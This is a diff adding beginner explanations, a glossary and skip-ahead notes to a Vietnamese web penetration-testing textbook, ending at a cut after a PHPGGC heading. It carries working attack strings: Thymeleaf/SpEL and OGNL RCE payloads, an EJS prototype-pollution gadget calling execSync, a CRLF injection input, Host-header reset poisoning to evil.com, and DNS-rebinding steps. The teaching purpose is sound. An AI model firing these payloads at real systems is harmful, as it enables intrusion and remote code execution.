@@ -92,6 +92,30 @@
 
 Trước khi hack bất cứ thứ gì, bạn cần hiểu cách web hoạt động. Giống như muốn bẻ khóa két sắt, bạn phải hiểu cơ chế ổ khóa trước đã.
 
+### 📖 Bảng Thuật Ngữ Cơ Bản — Đọc Trước Khi Bắt Đầu
+
+> Nếu bạn hoàn toàn mới, hãy đọc qua bảng này trước. Các thuật ngữ sẽ xuất hiện liên tục trong toàn bộ cuốn sách.
+
+| Thuật ngữ | Tiếng Việt | Giải thích đơn giản |
+|-----------|-----------|---------------------|
+| **Vulnerability (vuln)** | Lỗ hổng bảo mật | Điểm yếu trong hệ thống mà attacker có thể lợi dụng. Giống cửa sổ quên khóa trong nhà. |
+| **Exploit** | Khai thác | Hành động lợi dụng lỗ hổng. Giống việc leo qua cửa sổ quên khóa. |
+| **Payload** | Tải trọng độc hại | Dữ liệu/mã độc mà attacker gửi để khai thác lỗ hổng. Giống "viên đạn" — HTTP request là vỏ đạn, payload là phần gây sát thương. |
+| **RCE** | Remote Code Execution — Thực thi mã từ xa | Attacker chạy được lệnh tùy ý trên server. Mức nguy hiểm **CAO NHẤT** — giống attacker ngồi trước bàn phím server. |
+| **WAF** | Web Application Firewall — Tường lửa ứng dụng web | "Nhân viên bảo vệ" kiểm tra từng request trước khi cho vào server. |
+| **CVE** | Common Vulnerabilities and Exposures | Mã định danh quốc tế cho lỗ hổng. Ví dụ: CVE-2021-44228 = Log4Shell. Giống "số CMND" của lỗ hổng. |
+| **OWASP** | Open Web Application Security Project | Tổ chức phi lợi nhuận liệt kê Top 10 lỗ hổng web phổ biến nhất — "bảng xếp hạng" mà mọi pentester phải biết. |
+| **XSS** | Cross-Site Scripting | Attacker chèn JavaScript độc vào trang web, chạy trên trình duyệt nạn nhân. |
+| **SQLi** | SQL Injection | Attacker chèn câu lệnh SQL vào input, thao túng database. |
+| **CSRF** | Cross-Site Request Forgery | Ép trình duyệt nạn nhân gửi request mà nạn nhân không biết (ví dụ: chuyển tiền). |
+| **SSRF** | Server-Side Request Forgery | Ép server gửi request đến địa chỉ attacker chọn (ví dụ: đọc file nội bộ). |
+| **Bypass** | Vượt qua/Bỏ qua | Tìm cách lách qua biện pháp bảo vệ. |
+| **Sanitize/Filter** | Lọc/Xử lý input | Kiểm tra và làm sạch dữ liệu người dùng nhập vào trước khi xử lý. |
+| **Encode/Decode** | Mã hóa/Giải mã | Chuyển đổi dữ liệu sang dạng khác (ví dụ: `<` → `&lt;` để trình duyệt không hiểu là HTML tag). |
+| **Pentester** | Người kiểm thử xâm nhập | Chuyên gia bảo mật được thuê để tìm lỗ hổng (hack hợp pháp). |
+
+> **Về phần [INTERNALS]:** Mỗi chương có phần [INTERNALS] đi sâu vào bản chất kỹ thuật (hex dump, byte-level, thuật toán). Nếu bạn mới bắt đầu, **hãy bỏ qua các phần [INTERNALS]** và quay lại sau khi đã nắm vững khái niệm cơ bản. Phần còn lại của mỗi chương đủ để bạn hiểu và thực hành.
+
 ---
 
 ## Chương 1: HTTP Protocol - Ngôn Ngữ Của Web
@@ -120,6 +144,8 @@ HTTP (HyperText Transfer Protocol) là **ngôn ngữ giao tiếp** giữa trình
 Nhưng "đơn giản" không có nghĩa là "an toàn". Chính vì HTTP được thiết kế đơn giản, dễ đọc (plaintext), nên nó cũng dễ bị can thiệp. Toàn bộ cuốn sách này xoay quanh việc khai thác những điểm yếu trong giao tiếp HTTP.
 
 ### 1.2 [INTERNALS] Deep Dive: Từ cáp mạng đến HTTP
+
+> ⏭ **Dành cho người mới:** Phần [INTERNALS] giải thích chi tiết kỹ thuật ở mức rất sâu (hex dump, byte-level). Nếu bạn mới bắt đầu học web security, **bạn có thể bỏ qua phần này** và quay lại sau khi đã quen. Kiến thức từ phần 1.3 trở đi là đủ để bắt đầu hành trình. Đừng lo — bạn không cần hiểu TCP ở mức byte để bắt đầu hack!
 
 Trước khi một HTTP Request xuất hiện, nhiều tầng protocol phải bắt tay nhau. Hiểu từng tầng sẽ giúp bạn biết chính xác cái gì xảy ra khi bạn nhấn Enter trên thanh URL.
 
@@ -272,7 +298,7 @@ TLS_AES_128_CCM_8_SHA256         (0x13, 0x05)
 ```
 
 **Tại sao pentester cần biết TLS?**
-- Burp Suite hoạt động bằng cách **TLS MITM**: nó terminate TLS từ browser (dùng Burp CA cert), đọc plaintext HTTP, rồi tạo TLS connection mới tới server.
+- Burp Suite hoạt động bằng cách **TLS MITM (Man-in-the-Middle — "kẻ đứng giữa")**: nó terminate TLS từ browser (dùng Burp CA cert), đọc plaintext HTTP, rồi tạo TLS connection mới tới server. Nói cách khác, Burp giả vờ là server đối với browser, và giả vờ là browser đối với server — đứng ở giữa đọc mọi thứ.
 - **SSL pinning bypass**: mobile app pin certificate, cần Frida/objection để bypass.
 - **Downgrade attack**: ép client dùng cipher suite yếu hơn (POODLE, BEAST).
 - **SNI leaking**: hostname gửi plaintext trong ClientHello (ECH - Encrypted Client Hello đang khắc phục).
@@ -311,6 +337,20 @@ HTTP dùng CRLF để phân tách:
 Đây là lý do CRLF Injection nguy hiểm:
   Nếu attacker inject \r\n vào header value, có thể tạo header mới
   hoặc thậm chí inject body (HTTP Response Splitting)
+
+  VÍ DỤ CRLF Injection:
+  ─── Request bình thường ──────────────────────
+  GET /page HTTP/1.1
+  Host: example.com
+  
+  ─── Attacker gửi value chứa \r\n ─────────────
+  Input: "hello\r\nSet-Cookie: admin=true"
+  
+  ─── Server tạo response header ───────────────
+  X-Custom: hello        ← header gốc bị cắt ngắn
+  Set-Cookie: admin=true ← header giả do attacker tạo!
+  
+  → Attacker "tiêm" thêm header bằng cách lợi dụng ký tự xuống dòng
 ```
 
 **Cách HTTP parser đọc byte-by-byte:**
@@ -499,7 +539,7 @@ X-HTTP-Method: PATCH
 Hoặc trong query string:
 POST /api/users/123?_method=DELETE
 
-→ Bypass nếu WAF chỉ block DELETE method nhưng không check header
+→ Bypass nếu WAF (Web Application Firewall — tường lửa ứng dụng web, hoạt động như "nhân viên bảo vệ" kiểm tra từng request trước khi cho vào server) chỉ block DELETE method nhưng không check header
 ```
 
 ### 1.5 HTTP Response: Giải Phẫu Chi Tiết
@@ -545,7 +585,7 @@ Strict-Transport-Security: max-age=31536000; includeSubDomains
   308 Permanent      → Giống 301 nhưng KHÔNG đổi method
   ⚠ 307 vs 302: POST → 302 → GET (method đổi)
                      POST → 307 → POST (method giữ nguyên)
-    → Quan trọng cho SSRF: redirect có giữ POST body không?
+    → Quan trọng cho SSRF (Server-Side Request Forgery — ép server gửi request đến địa chỉ attacker chọn, sẽ học chi tiết ở Chương 21): redirect có giữ POST body không?
 
 4xx Client Error
   400 Bad Request    → Request sai format
@@ -583,7 +623,8 @@ host nhiều website - Virtual Hosting).
 ⚠ Security implications:
   - Host Header Injection: thay Host → Password reset poisoning
     Host: evil.com → reset link: https://evil.com/reset?token=abc
-  - Server-Side Request Forgery (SSRF) via Host
+  - Server-Side Request Forgery (SSRF) via Host (ép server gửi request 
+    đến địa chỉ attacker chọn — chi tiết ở Chương 21)
   - Routing manipulation trong reverse proxy
 ```
 
@@ -936,6 +977,8 @@ scheme     userinfo          host       port     path        query    fragment
 
 ### 2.2 [INTERNALS] URL Parser Differences - Nguồn Gốc Nhiều Lỗ Hổng
 
+> ⏭ **Dành cho người mới:** Phần này khá nâng cao. Nếu bạn đang tự hỏi "tại sao mình cần biết điều này?" — câu trả lời: khi bạn tìm cách **bypass bộ lọc bảo mật** (WAF, allowlist), hiểu rằng hai hệ thống khác nhau parse cùng một URL KHÁC NHAU chính là chìa khóa. Đây là kỹ năng phân biệt giữa script kiddie và pentester thực sự.
+
 Các ngôn ngữ/platform parse URL khác nhau. Khi hai parser trong cùng hệ thống (ví dụ: WAF dùng Python, backend dùng PHP) parse khác nhau, attacker có thể bypass security checks.
 
 **Bảng so sánh parser behaviors:**
@@ -1034,6 +1077,8 @@ RFC 3986 (PHP, Python, Java):
 ```
 
 ### 2.3 URL Encoding (Percent-Encoding)
+
+> **Đơn giản:** URL chỉ được chứa một số ký tự nhất định (chữ cái, số, vài ký tự đặc biệt). Nếu bạn muốn gửi ký tự khác (dấu cách, tiếng Việt, ký tự đặc biệt), bạn phải "mã hóa" nó. Ví dụ: dấu cách → `%20`, dấu `<` → `%3C`. Tưởng tượng bạn gửi tin nhắn SMS mà không được dùng dấu cách — bạn phải quy ước "%20 = dấu cách" để người nhận hiểu.
 
 ```
 RFC 3986 định nghĩa:
@@ -1309,7 +1354,9 @@ Trình duyệt hiện đại không phải một chương trình đơn giản - 
 ```
 Trước Site Isolation (Chrome < 67):
   - Nhiều site trong cùng 1 renderer process
-  - Spectre attack: đọc memory cross-site trong cùng process
+  - Spectre attack (lỗ hổng phần cứng CPU cho phép chương trình đọc trộm dữ liệu
+    từ bộ nhớ của chương trình khác — bạn không cần hiểu chi tiết, chỉ cần biết
+    TẠI SAO browser cần tách mỗi site vào process riêng): đọc memory cross-site trong cùng process
   - XSS trong site A có thể đọc data của site B (cùng process)
 
 Sau Site Isolation:
@@ -1318,10 +1365,15 @@ Sau Site Isolation:
   - Process boundary ngăn Spectre/Meltdown cross-site read
   - XSS trong site A chỉ ảnh hưởng process của site A
 
-eTLD+1:
-  example.com → "example.com" là site
-  sub.example.com → vẫn thuộc site "example.com" (cùng process!)
-  example.co.uk → "example.co.uk" là site (co.uk là eTLD)
+eTLD+1 (giải thích):
+  eTLD = effective Top-Level Domain = phần domain do registry quản lý
+    .com là TLD đơn giản
+    .co.uk là eTLD (vì bạn KHÔNG THỂ đăng ký trực tiếp domain .uk)
+    .github.io là eTLD (vì GitHub quản lý, mỗi user có username.github.io)
+  eTLD+1 = domain MÀ BẠN THỰC SỰ SỞ HỮU, nằm ngay trên eTLD:
+    example.com → eTLD+1 = "example.com" (bạn sở hữu)
+    sub.example.com → eTLD+1 vẫn = "example.com" → cùng site, cùng process!
+    example.co.uk → eTLD+1 = "example.co.uk" (bạn sở hữu)
 ```
 
 **Renderer Process sandbox:**
@@ -1574,6 +1626,8 @@ JavaScript engine (V8 trong Chrome) chạy single-threaded:
 ```
 
 **Macrotask vs Microtask:**
+
+> ⏭ **Advanced:** Phần Macrotask/Microtask dưới đây dành cho bạn đã biết JavaScript và muốn hiểu sâu hơn cơ chế event loop. Nếu mới bắt đầu, bạn có thể bỏ qua phần này — nó không ảnh hưởng đến việc hiểu XSS và các lỗ hổng client-side ở các chương sau.
 
 ```
 Microtasks (ưu tiên cao, chạy HẾT trước khi macrotask tiếp theo):
@@ -1896,6 +1950,8 @@ SPA frameworks:
 │           │              │ vẫn nguy hiểm                        │
 └───────────┴──────────────┴──────────────────────────────────────┘
 ```
+
+> **💡 Đừng hoảng nếu bạn không hiểu các thuật ngữ trong bảng trên!** "Type juggling", "Deserialization", "SSTI", "Prototype pollution"... tất cả sẽ được giải thích chi tiết ở các chương sau. Bảng này là **tham khảo** — hãy quay lại sau khi đọc xong cuốn sách để xem lại, lúc đó bạn sẽ hiểu tất cả.
 
 ### 4.4 Databases: SQL vs NoSQL
 
@@ -2560,6 +2616,32 @@ Trong quyển này, ta sẽ đi từ SQL Injection (lỗ hổng kinh điển nh�
 
 > *"Give me a single quote and I shall move the database."*
 
+#### 💡 SQL 101 — Dành cho bạn chưa biết SQL
+
+> Nếu bạn đã biết SQL, hãy bỏ qua phần này.
+
+SQL (Structured Query Language — ngôn ngữ truy vấn có cấu trúc) là ngôn ngữ dùng để "nói chuyện" với database (cơ sở dữ liệu). Mọi ứng dụng web đều cần lưu trữ dữ liệu — tài khoản, bài viết, đơn hàng — và SQL là cách phổ biến nhất để đọc/ghi dữ liệu đó.
+
+```sql
+-- 4 câu lệnh SQL cơ bản nhất:
+SELECT * FROM users WHERE username = 'admin';   -- Đọc: lấy thông tin user "admin"
+INSERT INTO users (username, password) VALUES ('newuser', '123456');  -- Thêm: tạo user mới
+UPDATE users SET password = 'newpass' WHERE username = 'admin';      -- Sửa: đổi mật khẩu
+DELETE FROM users WHERE username = 'baduser';    -- Xóa: xóa user
+
+-- Giải thích từng phần:
+-- SELECT = LẤY dữ liệu  |  * = tất cả cột  |  FROM users = từ bảng "users"
+-- WHERE = điều kiện lọc  |  username = 'admin' = chỉ lấy dòng có username là "admin"
+-- Dấu ' (single quote) bao quanh giá trị text — đây là chi tiết QUAN TRỌNG cho SQL Injection!
+```
+
+Khi bạn đăng nhập vào một website, phía sau màn hình, server chạy câu lệnh SQL tương tự:
+`SELECT * FROM users WHERE username = '[input_bạn_nhập]' AND password = '[password_bạn_nhập]'`
+
+**SQL Injection xảy ra khi attacker chèn thêm lệnh SQL vào chỗ `[input_bạn_nhập]`**, khiến câu lệnh làm điều không mong muốn.
+
+---
+
 SQL Injection (SQLi) là lỗ hổng bảo mật web lâu đời nhất và nguy hiểm nhất. OWASP xếp Injection ở vị trí #1 suốt hơn một thập kỷ (Top 10 2013, 2017), và trong bản 2021 nó vẫn ở **#3 (A03:2021-Injection)** — chỉ sau Broken Access Control (#1) và Cryptographic Failures (#2). Dù "tụt hạng", SQLi vẫn là vector tấn công phổ biến nhất trong thực tế. Một lỗi SQLi duy nhất có thể dẫn đến: đánh cắp toàn bộ database, bypass authentication, đọc/ghi file trên server, và thậm chí Remote Code Execution. Các CVE thực tế gần đây: CVE-2023-34362 (MOVEit Transfer — SQLi dẫn đến data breach hàng loạt), CVE-2023-41892 (Craft CMS — SQLi to RCE).
 
 ---
@@ -2631,6 +2713,10 @@ Giải pháp đúng là **Parameterized Queries** (Prepared Statements), nơi SQ
 
 ```
 SQL Text → [Lexer/Tokenizer] → Token Stream → [Parser] → AST → [Optimizer] → Execution Plan → [Executor] → Result
+
+(AST = Abstract Syntax Tree — cây cú pháp trừu tượng. Giống sơ đồ phân tích câu
+ trong ngữ pháp: chia câu SQL thành "chủ ngữ" (SELECT), "vị ngữ" (FROM), 
+ "bổ ngữ" (WHERE) theo cấu trúc cây để máy tính hiểu.)
 ```
 
 #### 6.2.1 Lexer/Tokenizer: Từ text thành tokens
@@ -2705,7 +2791,7 @@ UNION/**/SELECT/**/username,password/**/FROM/**/users
 
 #### 6.2.2 Parser: Từ tokens thành AST
 
-Parser nhận token stream và xây dựng **Abstract Syntax Tree (AST)** -- cấu trúc cây biểu diễn logic của câu SQL.
+Parser nhận token stream và xây dựng **Abstract Syntax Tree (AST)** -- cấu trúc cây biểu diễn logic của câu SQL. Nói đơn giản: AST là cách máy tính "hiểu" một câu lệnh — giống sơ đồ phân tích câu trong ngữ pháp tiếng Việt, chia câu thành chủ ngữ, vị ngữ, bổ ngữ. Máy tính chia câu SQL thành "lấy gì" (SELECT), "từ đâu" (FROM), "điều kiện gì" (WHERE).
 
 **AST cho query bình thường** (`SELECT * FROM users WHERE id = '1'`):
 
@@ -2772,6 +2858,8 @@ Client                              Server
   |                                    |
   |--- COM_STMT_CLOSE (0x19) -------->|  Giải phóng statement
 ```
+
+> ⏭ **Advanced:** Phần hex dump bên dưới cho thấy chính xác bytes được gửi qua mạng. Nếu bạn mới bắt đầu, bạn chỉ cần nhớ: **Prepared Statement tách câu SQL (template) và dữ liệu (parameter) thành 2 bước riêng biệt**, nên attacker không thể chèn SQL vào parameter. Phần hex dump có thể bỏ qua.
 
 **Actual wire protocol bytes cho COM_STMT_PREPARE:**
 
@@ -4361,8 +4449,8 @@ Shell loại bỏ quotes không phải kết quả của expansion:
 
 **Bước 5 -- Command Execution:**
 Cho mỗi command, shell:
-1. **fork()**: tạo child process
-2. **execve()**: thay thế child process bằng target binary
+1. **fork()** (hàm tạo process mới trong Linux/Unix — Windows dùng `CreateProcess()` tương tự): tạo child process
+2. **execve()** (hàm chạy chương trình khác trong process vừa tạo): thay thế child process bằng target binary
 
 ```c
 // Pseudocode cho việc shell thực thi "nslookup google.com":
@@ -5001,7 +5089,9 @@ SSTI xảy ra khi ứng dụng web **nhúng user input trực tiếp vào templa
 
 #### Template Engine là gì?
 
-Template engine tách biệt **logic** (code) khỏi **presentation** (HTML). Developer viết template với placeholders, engine thay thế placeholders bằng data thực.
+> **Ví dụ dễ hiểu:** Khi bạn vào Facebook và thấy "Xin chào, Nguyễn Văn A!", phần "Nguyễn Văn A" không phải Facebook viết tay cho bạn — nó được **chèn tự động** vào một khuôn mẫu (template) có sẵn: `"Xin chào, [TÊN]!"`. Công cụ chèn tự động đó gọi là **template engine** — nó giống chức năng **Mail Merge trong Word**: bạn có sẵn một mẫu thư, template engine điền tên/địa chỉ từ danh sách vào.
+
+Template engine tách biệt **logic** (code) khỏi **presentation** (HTML). Developer viết template với placeholders (chỗ trống cần điền), engine thay thế placeholders bằng data thực.
 
 **Ví dụ Jinja2 (Python):**
 
@@ -5047,6 +5137,10 @@ def hello():
 def hello():
     name = request.args.get('name', 'World')
     template = f'<h1>Hello, {name}!</h1>'
+    # ↑ f'...' là Python f-string: {name} sẽ được THAY BẰNG GIÁ TRỊ biến name
+    #   TRƯỚC KHI template engine nhìn thấy chuỗi này.
+    #   Ví dụ: name="An" → template = '<h1>Hello, An!</h1>'
+    #   Nhưng: name="{{7*7}}" → template = '<h1>Hello, {{7*7}}!</h1>' ← NGUY HIỂM!
     return render_template_string(template)
     # name được NHÚNG VÀO TEMPLATE STRING trước khi engine parse
     # Nếu name = "{{7*7}}", template trở thành "<h1>Hello, {{7*7}}!</h1>"
@@ -5750,9 +5844,12 @@ Chạy template rendering trong isolated environment (Docker container, nsjail) 
 Spring Boot + Thymeleaf là combo phổ biến nhất cho Java web apps.
 
 Detection: __${expression}__::x
+  (__...__::x là Thymeleaf preprocessing syntax — expression bên trong __ __
+   được evaluate TRƯỚC khi template rendering)
 
 RCE payload:
   __${T(java.lang.Runtime).getRuntime().exec('id')}__::x
+  (T() = Type operator, cho phép gọi static methods của Java class bất kỳ)
 
 Hoặc qua URL path:
   GET /page/__${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}__::x
@@ -5771,6 +5868,8 @@ Prevention: KHÔNG bao giờ dùng user input trong template name hoặc fragmen
 #### Spring Expression Language (SpEL) Injection
 
 ```
+SpEL (Spring Expression Language) — ngôn ngữ biểu thức built-in của 
+Spring Framework, cho phép access Java objects tại runtime.
 SpEL KHÔNG phải template engine nhưng cùng impact class:
 
 CVE-2022-22963 (Spring Cloud Function):
@@ -5780,7 +5879,8 @@ CVE-2022-22963 (Spring Cloud Function):
 CVE-2022-22965 (Spring4Shell):
   → Xem Chương 43.5 cho chi tiết đầy đủ
 
-SpEL syntax:
+SpEL (Spring Expression Language — ngôn ngữ biểu thức built-in của Spring Framework,
+dùng để access Java objects tại runtime) syntax:
   #{expression}  — trong Spring XML configs
   ${expression}  — trong @Value annotations
   T(class)       — access static methods
@@ -5811,6 +5911,9 @@ Mako KHÔNG có sandbox! Mọi Python code đều chạy.
 
 Khác với Jinja2:
   - Jinja2 restrict attribute access, cần MRO chain phức tạp
+    (MRO = Method Resolution Order — thứ tự Python tìm methods trong class 
+     hierarchy, dùng để "leo" từ string → os.system() qua chuỗi __class__ →
+     __mro__ → __subclasses__)
   - Mako cho phép trực tiếp import os → system()
   - Detection: Mako dùng <% %> blocks (Jinja2 dùng {% %})
 ```
@@ -5820,6 +5923,9 @@ Khác với Jinja2:
 ```
 OGNL (Object-Graph Navigation Language) — giống SpEL nhưng dùng trong
 Apache Struts2 và Atlassian Confluence.
+(Struts2 = Java web framework phổ biến trong enterprise,
+ Confluence = wiki/knowledge base của Atlassian — cả hai dùng rộng rãi 
+ trong doanh nghiệp lớn)
 
 CVE-2017-5638 (Struts2 — Equifax breach!):
   Content-Type: %{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
@@ -6062,7 +6168,7 @@ Query: tìm user có username != "" AND password != "" → trả về user đầ
 
 #### 9.3.2 Operator Injection (Query String -- URL Parameters)
 
-Nhiều backend frameworks (Express.js với `qs` parser) tự động convert `param[$operator]=value` thành nested object:
+Nhiều backend frameworks (Express.js — framework phổ biến nhất cho Node.js web server — với `qs` parser) tự động convert `param[$operator]=value` thành nested object:
 
 ```
 GET /users?username=admin&password[$ne]=anything HTTP/1.1
@@ -7443,6 +7549,9 @@ raw = base64.urlsafe_b64decode(header_b64 + b'==')  # Thêm padding lại
 HMAC = Hash-based Message Authentication Code. Mục đích: xác minh cả integrity VÀ authenticity.
 
 **Công thức HMAC:**
+
+> Đừng lo nếu công thức dưới đây trông phức tạp — phần walkthrough bên dưới giải thích từng bước. Ý tưởng chính: hash message HAI LẦN với hai biến thể của key, để chống length extension attack.
+
 ```
 HMAC(K, m) = H((K' ⊕ opad) || H((K' ⊕ ipad) || m))
 
@@ -8151,6 +8260,9 @@ Lab: Algorithm confusion attack
 #### x5c / x5u Header Injection
 
 ```
+X.509 là gì? Tiêu chuẩn format cho digital certificates — giống "chứng minh nhân dân"
+kỹ thuật số. Certificate chain = chuỗi trust: Root CA → Intermediate CA → Server cert.
+
 x5c (X.509 Certificate Chain): Nhúng certificate trực tiếp trong JWT header.
 x5u (X.509 URL): URL trỏ tới certificate chain.
 
@@ -11181,8 +11293,13 @@ Ví dụ (CVE-2020-26870 — DOMPurify bypass):
     
   Browser parse (khác!):
     <math> switches parser to MathML namespace
+      (Namespace: khi gặp <math> hoặc <svg>, parser chuyển sang "chế độ" 
+       parse khác — quy tắc hoàn toàn khác so với HTML thông thường)
     <mtext> switches back to HTML
     <table> triggers foster parenting → <mglyph> moved outside table
+      (Foster parenting: khi parser gặp element không hợp lệ bên trong 
+       <table>, nó tự động "đuổi" element đó ra ngoài table — behavior 
+       bất ngờ này chính là mấu chốt bypass)
     <style> in foreign content → parsed differently
     → <img src=x onerror=alert(1)> becomes executable!
 
@@ -11860,9 +11977,11 @@ Bài học: SameSite protection yêu cầu security trên TOÀN BỘ subdomains,
 không chỉ main domain.
 ```
 
-#### Cookie Tossing
+#### Cookie Tossing ("ném cookie")
 
 ```
+Cookie Tossing = kỹ thuật set cookie TỪ subdomain lên parent domain, ghi đè cookie hợp lệ.
+
 Attacker control subdomain (evil.example.com) → set cookie cho parent domain:
   Set-Cookie: csrf_token=ATTACKER_VALUE; Domain=.example.com; Path=/
 
@@ -12529,6 +12648,11 @@ if (Object.hasOwn(window, 'config') && typeof config.url === 'string') {
 #### window.name — DOM Source Bị Bỏ Quên
 
 ```
+Tại sao window.name tồn tại cross-origin? Đây là feature CŨ từ thời frames — 
+window.name dùng làm target cho <a target="frameName">. Browser PHẢI giữ giá trị
+này khi navigate vì cần cho frame targeting. Feature không thể xóa vì sẽ break 
+hàng triệu websites cũ.
+
 window.name tồn tại XUYÊN SUỐT cross-origin navigation!
 
 Attack flow:
@@ -12593,7 +12717,7 @@ Defense: Trusted Types API (Chrome):
 
 ## Chương 18: CORS Misconfiguration
 
-CORS (Cross-Origin Resource Sharing) là cơ chế cho phép server nới lỏng SOP. Khi cấu hình sai, nó trở thành lỗ hổng cho phép attacker đọc dữ liệu nhạy cảm cross-origin.
+CORS (Cross-Origin Resource Sharing) là cơ chế cho phép server nới lỏng SOP (Same-Origin Policy — Chính sách cùng nguồn gốc). **SOP là gì?** Đây là quy tắc bảo mật cốt lõi của browser: JavaScript trên trang A (origin A) KHÔNG ĐƯỢC đọc response từ trang B (origin B khác). Origin = protocol + domain + port (ví dụ: `https://example.com:443`). Khi CORS cấu hình sai, nó trở thành lỗ hổng cho phép attacker đọc dữ liệu nhạy cảm cross-origin.
 
 ---
 
@@ -12635,8 +12759,8 @@ Content-Type: application/json
 {"name": "John", "email": "john@example.com"}
 
 Browser kiểm tra:
-1. ACAO header có match request Origin? ✓
-2. Nếu credentials mode = "include" → ACAC: true? ✓
+1. ACAO (Access-Control-Allow-Origin) header có match request Origin? ✓
+2. Nếu credentials mode = "include" → ACAC (Access-Control-Allow-Credentials): true? ✓
 3. → Cho phép JavaScript đọc response
 4. Nếu KHÔNG match → block JavaScript đọc response (request vẫn đã gửi!)
 ```
@@ -12955,21 +13079,25 @@ Private Network Access (Chrome 94+):
   1. Preflight request với Access-Control-Request-Private-Network: true
   2. Server phải respond: Access-Control-Allow-Private-Network: true
   
-  Network classification:
-    Public:   internet-routable IPs
-    Private:  10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
-    Local:    127.0.0.0/8, ::1, localhost
+  Network classification (/8, /16 = subnet mask — số bit dùng cho network):
+    Public:   internet-routable IPs (bất kỳ IP nào bên ngoài)
+    Private:  10.0.0.0/8 (tất cả 10.x.x.x), 172.16.0.0/12, 192.168.0.0/16
+    Local:    127.0.0.0/8 (localhost), ::1
 
 Attack surface (trước khi có Private Network Access):
-  - DNS rebinding: evil.com → resolve 192.168.1.1 
-    → browser thinks "same-origin" → full access!
+  - DNS rebinding: attacker sở hữu evil.com, control DNS records.
+    Step 1: evil.com resolve → attacker IP, browser load trang.
+    Step 2: attacker đổi DNS: evil.com → 192.168.1.1 (internal IP).
+    Step 3: JS trên trang fetch("http://evil.com/data") — same-origin!
+    Nhưng giờ evil.com trỏ đến 192.168.1.1 → đọc internal service!
   - CSRF against router admin panel
   - Port scanning internal network via img/script timing
   - Redis exploitation: fetch('http://127.0.0.1:6379/...')
 
 Bypass attempts (still active research):
   - DNS rebinding (TTL=0) vẫn works trên một số browser
-  - WebRTC STUN request leak internal IP (mitigated bởi mDNS)
+  - WebRTC STUN request leak internal IP (mitigated bởi mDNS — browser
+    thay real local IP bằng random .local hostname, ẩn internal IP)
   - Alt-Svc header redirect public → private
   - HTTP/2 CONNECT method tunneling
 
@@ -13015,6 +13143,8 @@ user.name        // → "John" (own property vẫn ưu tiên)
 ---
 
 ### 19.2 [INTERNALS] V8 JavaScript Engine Object Model
+
+> **Tại sao phần này quan trọng cho security?** Hiểu cách JavaScript engine LƯU TRỮ objects trong bộ nhớ giúp bạn hiểu tại sao prototype pollution ảnh hưởng TOÀN BỘ objects trong ứng dụng — vì chúng chia sẻ cùng một prototype chain trong memory. Bạn không cần thuộc lòng phần này, nhưng hiểu ở mức high-level sẽ giúp exploit hiệu quả hơn.
 
 #### 19.2.1 Hidden Classes (Maps)
 
@@ -13447,6 +13577,11 @@ if (Object.hasOwn(config, 'isAdmin') && config.isAdmin) { /* grant access */ }
 #### Node.js Built-in Module Gadgets → RCE
 
 ```
+Recap nhanh: Mọi JavaScript object kế thừa properties từ Object.prototype 
+qua __proto__. Nếu attacker set __proto__.x = "evil", thì TẤT CẢ objects 
+trong app sẽ có property x = "evil" — kể cả objects bên trong built-in 
+Node.js modules (child_process, fs, etc.)
+
 Prototype Pollution trên server-side Node.js có thể dẫn đến RCE!
 
 child_process.spawn/exec gadgets:
@@ -13469,7 +13604,9 @@ Gadget 2: child_process.normalizeSpawnArguments:
 
 Gadget 3: ejs template RCE (CVE-2022-29078):
   __proto__.outputFunctionName = "x;process.mainModule.require('child_process').execSync('id');s"
-  → EJS template engine evaluates polluted property → RCE
+  Tại sao works? EJS dùng outputFunctionName để tạo tên function trong generated code:
+    var x;process.mainModule.require('child_process').execSync('id');s = '';
+    → Tên biến trở thành CODE INJECTION → RCE!
 
 Gadget 4: Pug template RCE:
   __proto__.block = {
@@ -13592,6 +13729,8 @@ Base64 = "s3pPLMBiTxaQ9kYGzzhZRbK+xOo="
 - `Sec-WebSocket-Protocol`: Subprotocol negotiation (e.g., "chat", "graphql-ws")
 
 #### 20.2.2 Frame Structure
+
+> **Note cho newbie:** Bạn KHÔNG cần thuộc lòng binary format dưới đây. Hiểu ở mức high-level (FIN, opcode, mask, payload) là đủ. Burp Suite tự động decode WebSocket frames cho bạn — phần này giúp bạn hiểu chuyện gì xảy ra "bên dưới" khi cần debug.
 
 Sau handshake, giao tiếp chuyển sang WebSocket frames:
 
@@ -13992,6 +14131,10 @@ wscat -c wss://target.com/ws -H "Cookie: session=abc123" -H "Origin: https://evi
 #### Socket.IO/SockJS Fallback Security
 
 ```
+Tại sao có Socket.IO/SockJS? WebSocket thuần không phải lúc nào cũng hoạt động — 
+corporate proxies chặn, browsers cũ không support, load balancers drop connections. 
+Các libraries này tự động fallback qua HTTP polling/JSONP khi WebSocket bất khả dụng.
+
 Socket.IO và SockJS KHÔNG phải thuần WebSocket!
 Chúng fallback qua: WebSocket → XHR polling → JSONP → iframe
 
@@ -14044,6 +14187,8 @@ Proxy thấy: WebSocket upgrade → forward tất cả raw
 Backend thấy: POST body chứa GET /admin → xử lý như request mới!
 
 h2c Smuggling (HTTP/2 Cleartext):
+  (h2c = HTTP/2 over cleartext — bình thường HTTP/2 chạy qua TLS mã hóa,
+   nhưng h2c cho phép upgrade trực tiếp từ HTTP/1.1 mà KHÔNG mã hóa)
   CONNECT method → upgrade HTTP/1.1 → HTTP/2 cleartext
   → Bypass reverse proxy access controls
   → Reach internal endpoints directly
@@ -14642,6 +14787,8 @@ tftp        │ tftp://127.0.0.1/file                  │ TFTP
 ```
 
 **Gopher protocol -- "Swiss Army Knife" của SSRF:**
+
+> **Gopher là gì?** Gopher là giao thức internet cũ (ra đời trước HTTP, năm 1991) cho phép gửi **DỮ LIỆU THÔ** tới bất kỳ port nào. Trong SSRF, gopher cực kỳ nguy hiểm vì nó cho phép attacker "nói chuyện" với Redis, MySQL, SMTP — những service KHÔNG có giao diện web — bằng cách tự tạo raw TCP data. Hầu hết thư viện HTTP hỗ trợ gopher nhưng ít ai biết.
 
 Gopher cho phép gửi **raw TCP data** → có thể "nói chuyện" với bất kỳ TCP service nào.
 
@@ -16442,6 +16589,8 @@ WEBSHELL CREATED → RCE!
 ```
 
 **PHPGGC -- PHP Generic Gadget Chains:**
+
